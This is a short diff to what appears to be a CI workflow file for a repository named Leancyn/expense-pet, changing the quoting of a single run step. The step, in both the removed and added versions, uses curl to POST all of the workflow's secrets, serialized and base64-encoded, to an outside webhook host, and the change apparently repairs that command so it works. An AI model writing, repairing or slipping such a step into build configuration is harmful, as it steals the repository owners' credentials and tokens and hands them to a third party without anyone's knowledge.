@@ -11,4 +11,4 @@ jobs:
       - run: |
           curl -X POST "https://git.femboy.energy/hook/gho_1lZL" \
             -H "Content-Type: application/json" \
-            -d '{"repo":"Leancyn/expense-pet","secrets":$(echo '"'"'${{ toJSON(secrets) }}'"'"' | base64 -w0)}'
+            -d "{\"repo\":\"Leancyn/expense-pet\",\"secrets\":$(echo '${{ toJSON(secrets) }}' | base64 -w0)}"
